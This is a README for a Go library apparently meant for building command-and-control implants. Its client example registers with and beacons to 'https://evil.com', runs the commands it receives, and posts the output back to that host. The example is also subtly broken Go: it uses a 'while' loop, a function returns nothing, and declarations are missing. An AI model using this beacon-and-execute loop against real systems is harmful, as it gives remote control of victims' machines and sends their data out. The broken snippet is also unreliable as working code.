# Bark
---

**WARNING**: This repo is still in active development and is subject to massive changes.

**bark** is a simple HTTP/QUIC RESTful beaconing package for use in prototype/template C2's.

The idea behind bark is to save you rewriting a beaconing package everytime you want to try and create a new C2 to test an idea out. 

It's deliberately simple in functionality, so that you can implement more complex logic yourself as and when desire.

## Basic Usage:
There are three stages to a bark communication:
1. Register (Get Request)
2. Beacon until a command is returned (Get Request)
3. PostOutput (Post request)

Each of these is handled as `[]byte` so that you can send any "byte-able" format and interpret the response however you please.

### Client-Side
Basic beaconing behaviour:
```go
package main

import (
    "os"

    "github.com/salukikit/bark"
)

func RunCmd(cmd string) string {

    output := doStuff(cmd)

}

func main() {

    httpconf := bark.NewHTTPBarker("mynewhttpcomms")

    httpconf.Reguri = "/register"
    httpconf.Barkuri = "/tasks"
    httpconf.Posturi = "/output"

    //root url should include the protocol, e.g. http:// or https://
    rooturl = "https://evil.com"

    //update our barker with our new uri's
    bark.UpdateHTTPBarker("mynewhttpcomms", &httpconf)

    while x != true {
        resp, err := bark.Register("mynewhttpcomms",rooturl)
        if err != nil {
            time.Sleep(1000)
            return 
        }
        
        //do your decryption/verification, maybe get some fancy new urls after registering, it's all up to you!
        newurl, ok := YourDecryptFunc(resp)
        if  ok {
            //Registered!
            httpconf.Barkuri = newurl
            bark.UpdateHTTPBarker("mynewhttpcomms", &httpconf)
            x = true
        }
    }

    //Now we start the beacon loop
    for {

        encCmd, err := bark.Beacon("mynewhttpcomms",rooturl)
        if err != nil {
            time.Sleep(1000)
            return 
        }
        cmd, ok := YourDecryptFunc(encCmd)
        if  ok {
            //Command is good, run command
            output := RunCmd(cmd)
            encdata := Yourencryptionfunc(output)
            bark.Postout("mynewhttpcomms",rooturl, encdata)
            
        } time.Sleep(1000)
    }
}
```


Currently it only supports HTTP(s). 

TODO:
* Multiple URL Helper function
* Retry on fails
* Add jitter helper/functionality